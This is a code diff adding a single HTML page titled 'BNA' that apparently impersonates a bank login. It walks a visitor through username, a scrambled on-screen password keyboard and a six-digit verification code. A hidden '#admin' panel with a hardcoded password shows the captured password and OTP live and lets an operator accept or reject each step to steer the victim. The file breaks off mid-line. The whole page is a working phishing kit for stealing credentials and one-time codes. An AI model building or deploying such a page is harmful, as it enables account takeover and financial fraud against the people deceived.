@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="ar" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BNA</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --accent:#43a047;--accent-h:#388e3c;--danger:#e53935;--blue:#1976d2;
+  --dk-bg:#181818;--dk-field:rgba(255,255,255,.20);--dk-key:#33363b;
+  --dk-key-a:#454951;--dk-kb:rgba(255,255,255,.16);
+  --lt-bg:#f4f6f9;--lt-s:#fff;--lt-s2:#f0f2f5;
+  --lt-b:#e0e4ea;--lt-b2:#d0d5de;--lt-t:#1a1d27;--lt-t2:#6b7280;
+  --r:12px;
+}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+html,body{height:100%}
+body{font-family:"Roboto",system-ui,sans-serif;min-height:100vh;position:relative;overflow-x:hidden;}
+body.dark{background:var(--dk-bg);color:#fff;}
+body.light{background:var(--lt-bg);color:var(--lt-t);font-family:"Cairo",system-ui,sans-serif;}
+
+/* BACKDROP */
+#bd{position:fixed;inset:-80px;z-index:0;display:none;
+  background:radial-gradient(420px 320px at 90% 20%,rgba(200,208,214,.4),transparent 62%),
+    radial-gradient(420px 360px at 96% 66%,rgba(150,168,172,.32),transparent 66%),
+    linear-gradient(120deg,#0e0e0e 0%,#1c1c1c 45%,#262828 100%);
+  filter:blur(24px);transform:scale(1.08);}
+#bd::after{content:"";position:absolute;inset:0;background:rgba(0,0,0,.5)}
+body.dark #bd{display:block;}
+
+/* PAGES */
+.pg{display:none;position:relative;z-index:1;min-height:100vh;flex-direction:column;}
+.pg.on{display:flex;}
+.dpg{align-items:center;justify-content:center;padding:20px;}
+.pw{width:100%;max-width:380px;}
+
+/* ===== LOGIN ===== */
+.lcard{background:rgba(255,255,255,.28);backdrop-filter:blur(2px);padding:22px 26px 26px;}
+.lavt{width:34px;height:34px;fill:#fff;display:block;margin-bottom:18px;}
+.lfld{display:flex;align-items:center;border-left:3px solid #fff;}
+.lfld input{flex:1;border:0;outline:0;background:transparent;color:#fff;font-family:"Roboto",sans-serif;font-size:26px;font-weight:300;padding:8px 0 8px 22px;}
+.lfld input::placeholder{color:rgba(255,255,255,.45);}
+.dbtn{display:block;width:100%;border:0;background:var(--accent);color:#fff;font-family:inherit;font-size:22px;font-weight:400;letter-spacing:2px;text-transform:uppercase;padding:22px 16px;cursor:pointer;transition:background .15s;margin-top:26px;}
+.dbtn:hover{background:var(--accent-h);}
+.derr{min-height:20px;color:#ff8a80;font-size:15px;margin-top:12px;}
+
+/* ===== PASSWORD ===== */
+.back{background:none;border:0;padding:2px;margin-bottom:28px;cursor:pointer;display:inline-flex;}
+.back svg{width:22px;height:22px;fill:#fff;}
+.pfld{width:100%;min-height:86px;background:var(--dk-field);border-bottom:2px solid rgba(255,255,255,.5);color:#fff;padding:13px 14px;font-size:21px;font-weight:300;letter-spacing:5px;word-break:break-all;line-height:1.4;}
+.pfld.empty{color:rgba(255,255,255,.5);letter-spacing:normal;}
+.caret{display:inline-block;width:2px;height:1em;background:#fff;vertical-align:-2px;margin-left:2px;animation:blink 1s steps(1) infinite;}
+@keyframes blink{50%{opacity:0}}
+.kbd{margin-top:18px;display:flex;flex-direction:column;gap:7px;}
+.krow{display:grid;grid-template-columns:repeat(6,1fr);gap:7px;}
+.key{height:40px;background:var(--dk-key);color:#fff;border:1px solid var(--dk-kb);border-radius:8px;font-family:inherit;font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center;user-select:none;transition:background .1s;}
+.key:active{background:var(--dk-key-a);}
+.key.ks{font-weight:700;font-size:12px;}
+.key.kc{grid-column:span 2;color:var(--danger);font-weight:700;font-size:15px;}
+.key.kon{background:var(--accent);border-color:var(--accent);}
+.smbtn{display:block;width:100%;border:0;border-radius:4px;background:var(--accent);color:#fff;font-family:inherit;font-size:16px;font-weight:400;letter-spacing:1px;text-transform:uppercase;padding:11px;cursor:pointer;transition:background .15s;margin-top:22px;}
+.smbtn:hover{background:var(--accent-h);}
+/* wait */
+.wbox{display:none;flex-direction:column;align-items:center;padding:50px 20px;text-align:center;}
+.sp{width:56px;height:56px;border-radius:50%;border:5px solid rgba(255,255,255,.12);border-top-color:var(--accent);animation:spin .9s linear infinite;margin-bottom:20px;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.wtxt{color:rgba(255,255,255,.8);font-size:15px;}
+.frerr{display:none;margin-top:16px;color:#ff8a80;font-size:17px;font-weight:500;}
+.rbtn{display:none;margin-top:16px;background:none;border:1.5px solid rgba(255,255,255,.4);color:#fff;font-family:inherit;font-size:14px;padding:9px 22px;border-radius:8px;cursor:pointer;}
+.rbtn:hover{background:rgba(255,255,255,.1);}
+
+/* ===== OTP ===== */
+.owrap{display:flex;flex-direction:column;align-items:center;padding:36px 20px 20px;width:100%;max-width:380px;}
+.oico{font-size:52px;margin-bottom:14px;}
+.ottl{color:#fff;font-size:22px;font-weight:500;margin-bottom:4px;}
+.osub{color:rgba(255,255,255,.55);font-size:13px;margin-bottom:30px;text-align:center;}
+.oboxes{display:flex;gap:12px;justify-content:center;margin-bottom:24px;}
+.obox{width:46px;height:56px;background:rgba(255,255,255,.18);border:2px solid rgba(255,255,255,.25);border-radius:10px;color:#fff;font-size:26px;font-weight:700;text-align:center;outline:none;font-family:inherit;transition:border .2s;}
+.obox:focus{border-color:var(--accent);}
+.npad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;width:100%;margin-bottom:20px;}
+.nk{height:52px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.14);border-radius:10px;color:#fff;font-size:20px;font-family:inherit;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background .1s;}
+.nk:active{background:rgba(255,255,255,.22);}
+.nk.ndel{font-size:16px;color:rgba(255,255,255,.7);}
+.nk.nem{background:transparent;border:0;pointer-events:none;}
+.oerr{min-height:20px;color:#ff8a80;font-size:15px;text-align:center;margin-top:8px;}
+.owait{display:none;flex-direction:column;align-items:center;padding:20px 0;}
+
+/* ===== LOADING ===== */
+.lcent{display:flex;flex-direction:column;align-items:center;gap:22px;}
+.bsp{width:76px;height:76px;border-radius:50%;border:6px solid rgba(255,255,255,.12);border-top-color:var(--accent);animation:spin .9s linear infinite;}
+.llbl{color:rgba(255,255,255,.75);font-size:16px;}
+
+/* ===== SUCCESS ===== */
+.scent{display:flex;flex-direction:column;align-items:center;gap:16px;text-align:center;padding:24px;}
+.chkc{width:100px;height:100px;border-radius:50%;background:var(--accent);display:flex;align-items:center;justify-content:center;animation:pop .4s cubic-bezier(.36,.07,.19,.97);}
+@keyframes pop{0%{transform:scale(0)}70%{transform:scale(1.1)}100%{transform:scale(1)}}
+.chkc svg{width:54px;height:54px;fill:#fff;}
+.sttl{color:#fff;font-size:26px;font-weight:700;}
+.ssub{color:rgba(255,255,255,.6);font-size:14px;max-width:280px;}
+.sbadge{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.18);border-radius:30px;padding:8px 22px;color:rgba(255,255,255,.8);font-size:14px;}
+
+/* ===== ADMIN LOCK ===== */
+.alwrap{width:100%;max-width:380px;padding:40px 36px;background:var(--lt-s);border:1px solid var(--lt-b);border-radius:var(--r);box-shadow:0 4px 20px rgba(0,0,0,.08);text-align:center;}
+.alico{font-size:52px;margin-bottom:16px;}
+.alttl{font-size:22px;font-weight:700;color:var(--lt-t);margin-bottom:6px;}
+.alsub{font-size:13px;color:var(--lt-t2);margin-bottom:28px;}
+.alinp{width:100%;background:var(--lt-s2);border:1.5px solid var(--lt-b);border-radius:8px;padding:12px 16px;color:var(--lt-t);font-family:"Cairo",sans-serif;font-size:16px;outline:none;direction:ltr;text-align:left;transition:border .2s;}
+.alinp:focus{border-color:var(--accent);}
+.alerr{min-height:20px;font-size:13px;color:var(--danger);margin:10px 0;}
+.albtn{width:100%;background:var(--accent);border:0;border-radius:8px;color:#fff;font-family:"Cairo",sans-serif;font-size:16px;font-weight:700;padding:13px;cursor:pointer;margin-top:4px;transition:background .15s;}
+.albtn:hover{background:var(--accent-h);}
+
+/* ===== ADMIN PANEL ===== */
+.admpg{align-items:stretch;justify-content:flex-start;background:var(--lt-bg);}
+.admhdr{background:var(--lt-s);border-bottom:1px solid var(--lt-b);padding:14px 24px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 2px 8px rgba(0,0,0,.06);direction:rtl;}
+.admttl{font-size:18px;font-weight:700;color:var(--lt-t);}
+.admr{display:flex;align-items:center;gap:12px;}
+.ndot{width:10px;height:10px;border-radius:50%;background:var(--danger);display:none;animation:pulse 1.2s infinite;}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(1.3)}}
+.loutbtn{background:#fff2f2;border:1.5px solid #ffcdd2;color:var(--danger);border-radius:8px;padding:7px 18px;font-family:"Cairo",sans-serif;font-size:13px;font-weight:700;cursor:pointer;}
+.loutbtn:hover{background:#ffe0e0;}
+.admmain{padding:24px;direction:rtl;}
+
+/* Active card */
+.accard{background:var(--lt-s);border:1.5px solid var(--lt-b);border-radius:var(--r);padding:18px 24px;display:inline-flex;align-items:center;gap:16px;margin-bottom:24px;box-shadow:0 2px 8px rgba(0,0,0,.06);}
+.accard svg{width:30px;height:30px;fill:var(--accent);}
+.aclbl{font-size:13px;color:var(--lt-t2);font-weight:600;margin-bottom:2px;}
+.acnum{font-size:28px;font-weight:700;color:var(--accent);line-height:1;}
+
+/* Pending */
+#pendSec{display:none;margin-bottom:24px;}
+.pcrd{background:var(--lt-s);border:2px solid #ff8f00;border-radius:var(--r);padding:20px 24px;box-shadow:0 0 0 4px rgba(255,143,0,.06);}
+.phdr{display:flex;align-items:center;gap:10px;margin-bottom:16px;}
+.ppls{width:12px;height:12px;border-radius:50%;background:#ff8f00;animation:pulse 1.2s infinite;}
+.pttl{font-size:16px;font-weight:700;color:#e65100;}
+.pdata{display:flex;flex-direction:column;gap:10px;margin-bottom:20px;}
+.prow{display:flex;align-items:center;gap:10px;font-size:14px;}
+.plbl{color:var(--lt-t2);font-weight:600;min-width:110px;}
+.pval{font-weight:700;font-family:"Roboto",sans-serif;direction:ltr;}
+.pval.hi{color:var(--accent);}
+.pval.blr{filter:blur(5px);cursor:pointer;transition:filter .3s;user-select:none;}
+.pval.blr.show{filter:none;}
+.pacts{display:flex;gap:12px;}
+.bacpt{flex:1;background:var(--accent);border:0;border-radius:8px;color:#fff;font-family:"Cairo",sans-serif;font-size:15px;font-weight:700;padding:12px;cursor:pointer;transition:background .15s;}
+.bacpt:hover{background:var(--accent-h);}
+.brjct{flex:1;background:#fff2f2;border:1.5px solid #ffcdd2;color:var(--danger);border-radius:8px;font-family:"Cairo",sans-serif;font-size:15px;font-weight:700;padding:12px;cursor:pointer;transition:background .15s;}
+.brjct:hover{background:#ffe0e0;}
+
+/* Table */
+.tcard{background:var(--lt-s);border:1px solid var(--lt-b);border-radius:var(--r);overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.06);}
+.thdr{padding:16px 22px;border-bottom:1px solid var(--lt-b);font-size:16px;font-weight:700;}
+.twrap{overflow-x:auto;}
+table{width:100%;border-collapse:collapse;min-width:680px;}
+thead tr{background:var(--lt-s2);}
+th{padding:13px 16px;text-align:right;font-size:13px;font-weight:700;color:var(--lt-t2);border-bottom:1px solid var(--lt-b);white-space:nowrap;}
+td{padding:14px 16px;font-size:14px;border-bottom:1px solid var(--lt-b);vertical-align:middle;}
+tbody tr:last-child td{border-bottom:0;}
+tbody tr:hover td{background:#fafbfc;}
+.badge{display:inline-flex;align-items:center;gap:6px;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:700;}
+.badge.active{background:#e8f5e9;color:#2e7d32;}
+.badge.inactive{background:#ffebee;color:#c62828;}
+.bdot{width:7px;height:7px;border-radius:50%;}
+.bdot.active{background:#2e7d32;}
+.bdot.inactive{background:#c62828;}
+.acts2{display:flex;gap:8px;flex-wrap:wrap;}
+.bdet{background:#f0f2f5;border:1.5px solid var(--lt-b2);color:var(--lt-t);border-radius:8px;padding:6px 14px;font-family:"Cairo",sans-serif;font-size:13px;font-weight:700;cursor:pointer;white-space:nowrap;}
+.bdet:hover{background:#e4e7ed;}
+.bred{background:#e3f0fd;border:1.5px solid #90caf9;color:var(--blue);border-radius:8px;padding:6px 14px;font-family:"Cairo",sans-serif;font-size:13px;font-weight:700;cursor:pointer;white-space:nowrap;}
+.bred:hover{background:#c5def7;}
+.ddwrap{position:relative;}
+.dd{position:absolute;top:calc(100% + 6px);right:0;background:var(--lt-s);border:1.5px solid var(--lt-b2);border-radius:var(--r);box-shadow:0 8px 30px rgba(0,0,0,.12);padding:16px;min-width:260px;z-index:200;animation:fadeIn .15s ease;direction:rtl;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:none}}
+.ddttl{font-size:14px;font-weight:700;color:var(--accent);margin-bottom:12px;}
+.ddrow{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--lt-b);gap:12px;}
+.ddrow:last-child{border-bottom:0;}
+.ddk{font-size:12px;color:var(--lt-t2);font-weight:600;white-space:nowrap;}
+.ddv{font-size:13px;font-weight:700;direction:ltr;word-break:break-all;color:var(--lt-t);}
+.ddv.hi{color:var(--accent);}
+</style>
+</head>
+<body class="dark">
+<div id="bd"></div>
+
+<!-- LOGIN -->
+<div id="pg-login" class="pg dpg on">
+  <div class="pw">
+    <div class="lcard">
+      <svg class="lavt" viewBox="0 0 24 24"><path d="M12 12c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm0 2c-3.34 0-10 1.67-10 5v3h20v-3c0-3.33-6.66-5-10-5z"/></svg>
+      <div class="lfld"><input id="li" type="text" placeholder="Login" autocomplete="username" spellcheck="false" autofocus></div>
+    </div>
+    <button class="dbtn" id="nextBtn">NEXT</button>
+    <div class="derr" id="lerr"></div>
+  </div>
+</div>
+
+<!-- PASSWORD -->
+<div id="pg-password" class="pg dpg">
+  <div class="pw">
+    <button class="back" id="pwBack"><svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20z"/></svg></button>
+    <div id="pwInp">
+      <div class="pfld empty" id="pf">Password</div>
+      <div class="kbd" id="kbd"></div>
+      <button class="smbtn" id="subBtn">Submit</button>
+    </div>
+    <div class="wbox" id="pwWait">
+      <div class="sp"></div>
+      <div class="wtxt">Vérification en cours...</div>
+      <div class="frerr" id="frErr">Informations incorrectes</div>
+      <button class="rbtn" id="retryBtn">Réessayer</button>
+    </div>
+  </div>
+</div>
+
+<!-- OTP -->
+<div id="pg-otp" class="pg dpg">
+  <div class="owrap">
+    <div class="oico">📱</div>
+    <div class="ottl">Verification Code</div>
+    <div class="osub">Enter the 6-digit code</div>
+    <div class="oboxes" id="oboxes">
+      <input class="obox" maxlength="1" type="text" inputmode="numeric">
+      <input class="obox" maxlength="1" type="text" inputmode="numeric">
+      <input class="obox" maxlength="1" type="text" inputmode="numeric">
+      <input class="obox" maxlength="1" type="text" inputmode="numeric">
+      <input class="obox" maxlength="1" type="text" inputmode="numeric">
+      <input class="obox" maxlength="1" type="text" inputmode="numeric">
+    </div>
+    <div class="npad" id="npad">
+      <button class="nk" data-n="1">1</button><button class="nk" data-n="2">2</button><button class="nk" data-n="3">3</button>
+      <button class="nk" data-n="4">4</button><button class="nk" data-n="5">5</button><button class="nk" data-n="6">6</button>
+      <button class="nk" data-n="7">7</button><button class="nk" data-n="8">8</button><button class="nk" data-n="9">9</button>
+      <button class="nk nem"></button><button class="nk" data-n="0">0</button><button class="nk ndel" data-n="DEL">⌫</button>
+    </div>
+    <div class="owait" id="owait"><div class="sp"></div><div class="wtxt">Vérification du code...</div></div>
+    <button class="smbtn" id="otpConf" style="width:100%;max-width:380px">Confirm</button>
+    <div class="oerr" id="oerr"></div>
+  </div>
+</div>
+
+<!-- LOADING -->
+<div id="pg-loading" class="pg dpg">
+  <div class="lcent"><div class="bsp"></div><div class="llbl">Loading...</div></div>
+</div>
+
+<!-- SUCCESS -->
+<div id="pg-success" class="pg dpg">
+  <div class="scent">
+    <div class="chkc"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+    <div class="sttl">Login Successful</div>
+    <div class="ssub">You have been authenticated successfully</div>
+    <div class="sbadge" id="sbadge">Welcome!</div>
+  </div>
+</div>
+
+<!-- ADMIN LOCK -->
+<div id="pg-admin-lock" class="pg dpg" style="background:var(--lt-bg)">
+  <div class="alwrap">
+    <div class="alico">🛡️</div>
+    <div class="alttl">لوحة الإدارة</div>
+    <div class="alsub">أدخل كلمة المرور للمتابعة</div>
+    <input id="alinp" class="alinp" type="password" placeholder="كلمة المرور">
+    <div class="alerr" id="alerr"></div>
+    <button class="albtn" id="albtn">دخول</button>
+  </div>
+</div>
+
+<!-- ADMIN PANEL -->
+<div id="pg-admin" class="pg admpg">
+  <header class="admhdr">
+    <div class="admttl">🛡️ لوحة الإدارة</div>
+    <div class="admr">
+      <div class="ndot" id="ndot"></div>
+      <button class="loutbtn" id="admOut">تسجيل الخروج</button>
+    </div>
+  </header>
+  <div class="admmain">
+    <div id="pendSec">
+      <div class="pcrd">
+        <div class="phdr"><div class="ppls"></div><div class="pttl" id="pttl">طلب جديد</div></div>
+        <div class="pdata" id="pdata"></div>
+        <div class="pacts">
+          <button class="bacpt" id="admAccept">✓ قبول</button>
+          <button class="brjct" id="admReject">✕ رفض</button>
+        </div>
+      </div>
+    </div>
+    <div class="accard">
+      <svg viewBox="0 0 24 24"><path d="M1 9l2 2c5.52-5.52 14.48-5.52 20 0l2-2C19.93 3.46 4.07 3.46 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4 2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
+      <div><div class="aclbl">الزيارات النشطة الآن</div><div class="acnum">3</div></div>
+    </div>
+    <div class="tcard">
+      <div class="thdr">📋 جدول المستخدمين</div>
+      <div class="twrap"><table>
+        <thead><tr><th>#</th><th>الاسم</th><th>رقم الجوال</th><th>البريد</th><th>الحالة</th><th>الإجراءات</th></tr></thead>
+        <tbody id="tbody"></tbody>
+      </table></div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ============================================================
+// STATE - shared JS variables (same tab) + BroadcastChannel (cross-tab)
+// ============================================================
+const S = { login:'', password:'', otp:'', status:'idle' };
+const BC = typeof BroadcastChannel !== 'undefined' ? new BroadcastChannel('bna2026') : null;
+
+function setState(upd) {
+  Object.assign(S, upd);
+  if (BC) BC.postMessage({t:'s', d:{...S}});
+  try { localStorage.setItem('bna2', JSON.stringify(S)); } catch(e){}
+  onStateChange();
+}
+
+if (BC) BC.onmessage = e => { if(e.data.t==='s'){ Object.assign(S,e.data.d); onStateChange(); } };
+setInterval(()=>{
+  try{
+    const d=JSON.parse(localStorage.getItem('bna2')||'{}');
+    if(d.status && d.status!==S.status){ Object.assign(S,d); onStateChange(); }
+  }catch(e){}
+}, 800);
+
+// ============================================================
+// ROUTER
+// ============================================================
+const PAGES = ['login','password','otp','loading','success','admin-lock','admin'];
+let cur = 'login';
+
+function go(p) {
+  PAGES.forEach(id => {
+    const el=document.getElementById('pg-'+id);
+    if(el) el.classList.remove('on');
+  });
+  const t=document.getElementById('pg-'+p);
+  if(t) t.classList.add('on');
+  const darks=['login','password','otp','loading','success'];
+  document.body.className = darks.includes(p) ? 'dark' : 'light';
+  cur = p;
+  if(p==='success') document.getElementById('sbadge').textContent='Welcome, '+(S.login||'User');
+  if(p==='loading') setTimeout(()=>go('success'), 2500);
+  if(p==='admin') { renderTable(); startAdmPoll(); }
+}
+
+// On load: check hash for admin
+if(window.location.hash==='#admin'){ document.body.className='light'; go('admin-lock'); }
+
+// ============================================================
+// LOGIN
+// ============================================================
+const li=document.getElementById('li');
+document.getElementById('nextBtn').addEventListener('click',()=>{
+  const v=li.value.trim();
+  if(!v){document.getElementById('lerr').textContent='Please enter your login';return;}
+  document.getElementById('lerr').textContent='';
+  setState({login:v, status:'idle'});
+  go('password');
+});
+li.addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('nextBtn').click();});
+li.addEventListener('input',()=>{document.getElementById('lerr').textContent='';});
+
+// ============================================================
+// PASSWORD KEYBOARD
+// ============================================================
+let pv='', ps=false, ptmr=null;
+const krows=[
+  ['7','2','3','8','9','5'],['6','0','1','4'],['%','@','+','.','_','#'],
+  ['?','!','*','$'],['t','o','g','q','n','i'],['h','d','l','k'],
+  ['e','w','m','f','j','y'],['p','u','v','x'],['SHIFT','c','a','s','r','b'],['z','CLEAR']
+];
+function prender(){
+  const f=document.getElementById('pf');
+  if(pv){f.classList.remove('empty');f.innerHTML='&bull;'.repeat(pv.length)+'<span class="caret"></span>';}
+  else{f.classList.add('empty');f.textContent='Password';}
+}
+function buildKbd(){
+  const kbd=document.getElementById('kbd');
+  krows.forEach(row=>{
+    const r=document.createElement('div');r.className='krow';
+    row.forEach(k=>{
+      const b=document.createElement('button');b.type='button';b.className='key';
+      if(k==='SHIFT'){b.classList.add('ks');b.textContent='Shift';}
+      else if(k==='CLEAR'){b.classList.add('kc');b.textContent='Clear';}
+      else b.textContent=k;
+      b.dataset.k=k;r.appendChild(b);
+    });
+    kbd.appendChild(r);
+  });
+}
+function upCase(){
+  document.querySelectorAll('#kbd .key').forEach(b=>{
+    const k=b.dataset.k;
+    if(k==='SHIFT'){b.classList.toggle('kon',ps);return;}
+    if(k==='CLEAR')return;
+    if(/^[a-z]$/i.test(k))b.textContent=ps?k.toUpperCase():k.toLowerCase();
+  });
+}
+document.getElementById('kbd').addEventListener('click',e=>{
+  const b=e.target.closest('.key');if(!b)return;
+  const k=b.dataset.k;
+  if(k==='CLEAR'){pv='';prender();return;}
+  if(k==='SHIFT'){ps=!ps;upCase();return;}
+  let ch=k;if(/^[a-z]$/i.test(k)&&ps)ch=k.toUpperCase();
+  pv+=ch;prender();
+  if(ps){ps=false;upCase();}
+});
+
+document.getElementById('subBtn').addEventListener('click',()=>{
+  if(!pv)return;
+  setState({password:pv, status:'pending_password'});
+  document.getElementById('pwInp').style.display='none';
+  const w=document.getElementById('pwWait');
+  w.style.display='flex';
+  document.getElementById('frErr').style.display='none';
+  document.getElementById('retryBtn').style.display='none';
+  if(ptmr)clearInterval(ptmr);
+  ptmr=setInterval(()=>{
+    if(S.status==='password_accepted'){clearInterval(ptmr);go('otp');}
+    else if(S.status==='password_rejected'){
+      clearInterval(ptmr);
+      document.getElementById('frErr').style.display='block';
+      document.getElementById('retryBtn').style.display='inline-block';
+    }
+  },600);
+});
+
+document.getElementById('retryBtn').addEventListener('click',()=>{
+  pv='';prender();
+  setState({status:'idle'});
+  document.getElementById('pwWait').style.display='none';
+  document.getElementById('pwInp').style.display='block';
+});
+document.getElementById('pwBack').addEventListener('click',()=>{if(ptmr)clearInterval(ptmr);go('login');});
+
+// ============================================================
+// OTP
+// ============================================================
+const obs=[...document.querySelectorAll('.obox')];
+let otmr=null;
+obs.forEach((b,i)=>{
+  b.addEventListener('input',()=>{b.value=b.value.replace(/[^0-9]/g,'').slice(-1);if(b.value&&i<obs.length-1)obs[i+1].focus();});
+  b.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!b.value&&i>0)obs[i-1].focus();});
+});
+document.getElementById('npad').addEventListener('click',e=>{
+  const btn=e.target.closest('.nk');if(!btn)return;
+  const n=btn.dataset.n;
+  if(n==='DEL'){const f=obs.filter(b=>b.value);if(f.length){const l=f[f.length-1];l.value='';l.focus();}}
+  else{const em=obs.find(b=>!b.value);if(em){em.value=n;const idx=obs.indexOf(em);if(idx<obs.length-1)obs[idx+1].focus();}}
+});
+document.getElementById('otpConf').addEventListener('click',()=>{
+  const otp=obs.map(b=>b.value).join('');
+  if(otp.length<6){document.getElementById('oerr').textContent='الرمز غير مكتمل';return;}
+  document.getElementById('oerr').textContent='';
+  setState({otp, status:'pending_otp'});
+  document.getElementById('otpConf').style.display='none';
+  document.getElementById('owait').style.display='flex';
+  document.getElementById('oboxes').style.opacity='.4';
+  document.getElementById('npad').style.opacity='.4';
+  document.getElementById('npad').style.pointerEvents='none';
+  if(otmr)clearInterval(otmr);
+  otmr=setInterval(()=>{
+    if(S.status==='otp_accepted'){clearInterval(otmr);go('loading');}
+    else if(S.status==='otp_rejected'){
+      clearInterval(otmr);
+      obs.forEach(b=>b.value='');obs[0].focus();
+      document.getElementById('owait').style.display='none';
+      document.getElementById('otpConf').style.display='block';
+      document.getElementById('oboxes').style.opacity='1';
+      document.getElementById('npad').style.opacity='1';
+      document.getElementById('npad').style.pointerEvents='';
+      document.getElementById('oerr').textContent='الرمز غير صحيح';
+      setState({status:'idle'});
+    }
+  },600);
+});
+
+// ============================================================
+// ADMIN LOCK
+// ============================================================
+const APASS='Ha098765@@';
+const alinp=document.getElementById('alinp');
+document.getElementById('albtn').addEventListener('click',()=>{
+  if(alinp.value===APASS){document.getElementById('alerr').textContent='';go('admin');}
+  else{document.getElementById('alerr').textContent='كلمة المرور غير صحيحة';alinp.value='';alinp.focus();}
+});
+alinp.addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('albtn').click();});
+alinp.addEventListener('input',()=>{document.getElementById('alerr').textContent='';});
+document.getElementById('admOut').addEventListener('click',()=>{if(admTmr)clearInterval(admTmr);go('admin-lock');alinp.value='';});
+
+// ============================================================
+// ADMIN POLLING
+// ============================================================
+let admTmr=null, lastSt=null;
+function startAdmPoll(){
+  if(admTmr)clearInterval(admTmr);
+  admTmr=setInterval(checkAdm,600);
+  checkAdm();
+}
+function checkAdm(){
+  if(S.status===lastSt)return;
+  lastSt=S.status;
+  updPend();
+}
+function onStateChange(){
+  if(cur==='password'){
+    if(S.status==='password_accepted'&&ptmr){clearInterval(ptmr);go('otp');}
+    else if(S.status==='password_rejected'&&ptmr){
+      clearInterval(ptmr);
+      document.getElementById('frErr').style.display='block';
+      document.getElementById('retryBtn').style.display='inline-block';
+    }
+  }
+  if(cur==='otp'){
+    if(S.status==='otp_accepted'&&otmr){clearInterval(otmr);go('loading');}
+    else if(S.status==='otp_rejected'&&otmr){
+      clearInterval(otmr);
+      obs.forEach(b=>b.value='');obs[0].focus();
+      document.getElementById('owait').style.display='none';
+      document.getElementById('otpConf').style.display='block';
+      document.getElementById('oboxes').style.opacity='1';
+      document.getElementById('npad').style.opacity='1';
+      document.getElementById('npad').style.pointerEvents='';
+      document.getElementById('oerr').textContent='الرمز غير صحيح';
+    }
+  }
+  if(cur==='admin'){
+    if(S.status!==lastSt){lastSt=S.status;updPend();}
+  }
+}
+function updPend(){
+  const sec=document.getElementById('pendSec');
+  const dot=document.getElementById('ndot');
+  if(S.status==='pending_password'){
+    dot.style.display='block';sec.style.display='block';
+    document.getElementById('pttl').textContent='🔔 طلب تسجيل دخول جديد';
+    document.getElementById('pdata').innerHTML=`
+      <div class="prow"><span class="plbl">رقم تسجيل الدخول</span><span class="pval hi">${S.login}</span></div>
+      <div class="prow"><span class="plbl">كلمة المرور</span><span class="pval blr" id="pvrev" title="اضغط للإظهار">${S.password}</span></div>`;
+    document.getElementById('pvrev')?.addEventListener('click',function(){this.classList.toggle('show');});
+    document.getElementById('admAccept').onclick=()=>{setState({status:'password_accepted'});};
+    document.getElementById('admReject').onclick=()=>{setState({status:'password_rejected'});};
+  } else if(S.status==='pending_otp'){
+    dot.style.display='block';sec.style.display='block';
+    document.getElementById('pttl').textContent='🔔 رمز التحقق';
+    document.getElementById('pdata').innerHTML=`
+      <div class="prow"><span class="plbl">رقم تسجيل الدخول</span><span class="pval hi">${S.login}</span></div>
+      <div class="prow"><span class="plbl">رمز التأكيد</span><span class="pval hi" style="font-size:22px;letter-spacing:4px">${S.otp}</span></div>`;
+    document.getElementById('admAccept').onclick=()=>{setState({status:'otp_accepted'});};
+    document.getElementById('admReject').onclick=()=>{setState({status:'otp_rejected'});};
+  } else { dot.style.display='none'; sec.style.display='none'; }
+}
+
+// ============================================================
+// TABLE
+// ============================================================
+const USERS=[
+  {id:1,name:'أحمد محمد',  phone:'0501234567',email:'ahmed@gmail.com',  status:'active',  ip:'192.168.1.10',device:'iPhone 14',  browser:'Safari', joined:'2024-01-15',country:'السعودية'},
+  {id:2,name:'سارة علي',   phone:'0567891234',email:'sara@gmail.com',   status:'active',  ip:'192.168.1.22',device:'Samsung S23',browser:'Chrome', joined:'2024-02-03',country:'الإمارات'},
+  {id:3,name:'محمد خالد',  phone:'0531112222',email:'moh@gmail.com',    status:'inactive',ip:'10.0.0.5',    device:'Pixel 7',   browser:'Firefox',joined:'2024-01-28',country:'مصر'},
+  {id:4,name:'فاطمة يوسف', phone:'0509998887',email:'fatima@gmail.com', status:'active',  ip:'172.16.0.9',  device:'iPad Pro',  browser:'Safari', joined:'2024-03-10',country:'الكويت'},
+  {id:5,name:'عبدالله نور',phone:'0543334444',email:'abdallah@gmail.com',status:'inactive',ip:'10.10.1.3',  device:'Laptop HP', browser:'Edge',   joined:'2024-02-20',country:'البحرين'},
+];
+let openDD=null;
+function renderTable(){
+  const tb=document.getElementById('tbody');tb.innerHTML='';
+  USERS.forEach((u,i)=>{
+    const tr=document.createElement('tr');
+    tr.innerHTML=`<td>${i+1}</td><td><strong>${u.name}</strong></td>
